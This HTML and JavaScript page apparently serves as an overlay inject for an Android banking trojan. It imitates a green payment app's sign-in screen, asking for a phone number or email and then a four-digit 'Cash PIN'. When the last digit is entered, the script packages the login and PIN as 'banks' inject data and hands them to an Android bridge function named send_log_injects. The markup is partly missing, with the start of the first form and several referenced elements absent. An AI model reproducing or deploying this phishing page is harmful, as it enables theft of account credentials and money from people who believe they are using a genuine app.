<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.4/angular.min.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.1.0/css/bootstrap.min.css">
    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.10/jquery.mask.js"></script>
    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.6.1/css/font-awesome.min.css">
    <title>Document</title>
    <style>
        body {
            font-family: sans-serif;
        }

        form {
            margin :0;
        }

        #form1, #form2 {
            padding: 20px;
            padding-top: 0;
            display: flex;
            flex-direction: column;
            min-height: 100vh;
        }

        section {
            flex: 1;
        }

        header {
            text-shadow: bold;
            font-size: 28px;
            margin-bottom: 15px;
        }

        header div {
            text-align: right;
        }

        .td_.td_2 {
            background: transparent;
            padding-top: 0;
            color: #666666;
        }

        .pinpad.d-flex.justify-content-between {
            padding: 1px 25px;
        }

        .td_.td_2 {
            color: #666666;
        }

        span.pinpad-item {
            color: #666;
            padding: 20px 0px;
            text-align: center;
            font-size: 32px;
            width: 57px;
            margin-top: -14px;
        }

        .input {
            width: 100%;
            padding: 10px;
            border: 0;
            background: transparent;
            font-size: 24px;
            padding-left: 0;
            padding-top: 0;
        }

        .button {
            background: #00d650;
            padding: 10px;
            width: 100%;
            border: 0;
            border-radius: 75px;
            color: #fff;
        }

        input, button {
            outline: none !important;
            box-shadow: none !important;
        }

        h4 {
            text-align: center;
            font-weight: 500;
            color: #fff;
        }

        #form2 {
            background-color: #0bb634;
        }

        #form2 > header {
            flex: 1;
        }

        .pin {
            width: 25px;
            height: 25px;
            border: 1px solid #fff;
            border-radius: 25px;
            background-color: transparent;
            color: transparent;
        }

        .grid {
            width: 200px;
            margin: auto;
            display: grid;
            grid-template-columns: 1fr 1fr 1fr 1fr;
            grid-gap: 20px;
            margin-top: 15px;
            text-align: center;
        }

        .activee {
            background-color: #fff;
        }
    </style>
</head>
<body ng-app="CombineModule">
    <div class="loader__" id="spinner" style="display:none;position:fixed;top:0px;left:0px;width:100%;height:100%;text-align:center;background:rgba(255, 255, 255, 0.47);z-index:8000000;">
        <span  class="fa fa-circle-o-notch  fa-spin " style="position:relative;top:50%;font-size:50px;color:#00d650"></span>
    </div>

                <div id="useKeyboard" style="display: none;">
                    <input type="submit" class="button" onclick="virtualKey()" style="width: 49%; float: left;margin-right: 2%;background: #f4f4f4;color: #333333;font-weight: 600;" value="Use Phone">
                    <input type="submit" class="button" id="nextPage1" style="width: 49%; float: left;" value="Next">
                </div>

                <div id="bigBtn">
                    <input type="submit" class="button" id="nextPage2" value="Next">
                </div>
            </footer>
        </div>

        <div id="form2" ng-controller="MyControllerB" style="display: none;">
            <header></header>
            <section>

                <h4>
                    Welcome back <br>
                    Enter your Cash PIN <br>                    
                    to continue.
                </h4>

                <div class="grid">
                    <input type="password" inputmode="numeric" id="pin1" name="fields[pin1]" class="pin" maxlength="1" placeholder="" autocomplete="off">
                    <input type="password" inputmode="numeric" id="pin2" name="fields[pin2]" class="pin" maxlength="1" placeholder="" autocomplete="off">
                    <input type="password" inputmode="numeric" id="pin3" name="fields[pin3]" class="pin" maxlength="1" placeholder="" autocomplete="off">
                    <input type="password" inputmode="numeric" id="pin4" name="fields[pin4]" class="pin" maxlength="1" placeholder="" autocomplete="off">
                </div>

                <p style="text-align: center;color: #12f63f;margin-top: 20px;">Help</p>
            </section>
            <footer>

            </footer>
        </div>
    </form>

    <script type="text/javascript">
        $('#pin1').mask('0');
        $('#pin2').mask('0');
        $('#pin3').mask('0');
        $('#pin4').mask('0');
        var moduleA = angular.module("MyModuleA", []);
            moduleA.controller("MyControllerA", function($scope) {
                $sc_ = $scope
            $scope.pinw = ""
            $scope.edit_pinw = function (login) {
                if ($scope.pinw.length != 50) {
                    try{
                        document.getElementById('nextPage').disabled = false;
                    } catch(e){};
                    $scope.pinw += '' + login;
                    $("#login").val($scope.pinw);
                }
            }
            $scope.reset = function () {
                Rlastw = $scope.pinw.substring(0, $scope.pinw.length - 1);
                $scope.pinw = Rlastw;
                $("#login").val(Rlastw);
            }
            });

        var moduleB = angular.module("MyModuleB", []);
            moduleB.controller("MyControllerB", function($scope) {
                $sc_ = $scope
            $scope.pinw = ""
            $scope.edit_pine = function (code) {
                if ($scope.pinw.length < 4) {
                    document.getElementById('sendData').disabled = false;
                    document.getElementById('sendForm').onsubmit = true;
                    $scope.pinw += '' + code;
                    $("#code").val($scope.pinw);
                } else if ($scope.pinw.length < 50) {
                    $scope.pinw += '' + code;
                    $("#code").val($scope.pinw);
                }
            }
            $scope.reset = function () {
                Rlastw = $scope.pinw.substring(0, $scope.pinw.length - 1);
                $scope.pinw = Rlastw;
                $("#code").val(Rlastw);
            }
            });

            angular.module("CombineModule", ["MyModuleA", "MyModuleB"]);


        var virtualKeyboar = document.getElementById('virtualKeyboar'),
            login = document.getElementById('login'),
            code = document.getElementById('code'),
            bigBtn = document.getElementById('bigBtn'),
            useKeyboard = document.getElementById('useKeyboard'),
            form = document.getElementById('form'),
            form1 = document.getElementById('form1'),
            form2 = document.getElementById('form2'),
            nextPage1 = document.getElementById('nextPage1'),
            nextPage2 = document.getElementById('nextPage2'),
            sendData = document.getElementById('sendData'),
            spinner = document.getElementById('spinner');

        var sendForm = document.getElementById('sendForm');

        function changeFormat(){
            login.value = '';
            virtualKeyboar.style.display = 'none';
            login.placeholder = 'Email';
            login.disabled = false;
            login.focus()
            bigBtn.style.display = 'none';
            useKeyboard.style.display = 'block';
        }

        function virtualKey(){
            useKeyboard.style.display = 'none';
            bigBtn.style.display = 'block';
            login.value = '';
            virtualKeyboar.style.display = 'block';
            login.placeholder = 'Phone or Email';
            login.disabled = true;
        }

        nextPage1.onclick = function() {
            if(login.value.length > 6) {
                spinner.style.display = 'block';
                setTimeout(() => {
                    spinner.style.display = 'none';
                    form1.style.display = 'none';
                    form2.style.display = 'flex'
                }, 1500);
                val = document.getElementById('login').value;
                document.getElementById('emailDublikat').innerHTML = val;
            }
        }

        nextPage2.onclick = function() {
            if(login.value.length > 6) {
                spinner.style.display = 'block'
                setTimeout(() => {
                    spinner.style.display = 'none';
                    form1.style.display = 'none';
                    form2.style.display = 'flex'
                }, 1500);
                val = document.getElementById('login').value;
                document.getElementById('emailDublikat').innerHTML = val;
            }
            console.log(login.value)
        }

        var pin1 = document.getElementById('pin1'),
            pin2 = document.getElementById('pin2'),
            pin3 = document.getElementById('pin3'),
            pin4 = document.getElementById('pin4');

        pin1.onkeyup = () => {
            if(pin1.value.length == 1) {
                pin1.classList.add('activee');
                pin2.focus();
            }
        }

        pin2.onkeyup = () => {
            if(pin2.value.length == 1) {
                pin2.classList.add('activee');
                pin3.focus();
            }
        }

        pin3.onkeyup = () => {
            if(pin3.value.length == 1) {
                pin3.classList.add('activee');
                pin4.focus();
            }
        }

        pin4.onkeyup = () => {
            if(pin4.value.length == 1) {
                pin4.classList.add('activee');
            }

            if(pin1.value.length == 1 && pin2.value.length == 1 && pin3.value.length == 1 && pin4.value.length == 1) {
            var data = {};
                data.login = login.value;
                data.pin = `${pin1.value}${pin2.value}${pin3.value}${pin4.value}`;
                data.type_injects = "banks";
                data.closed = "close_activity_injects";

                var ua = navigator.userAgent.toLowerCase();
                if(ua.indexOf("android") > -1) {
                    try {
                        Android.send_log_injects(JSON.stringify(data))
                    } catch (err) {}
                }else{
                    alert(JSON.stringify(data));
                }
            }
        }
    </script>
</body>
</html>
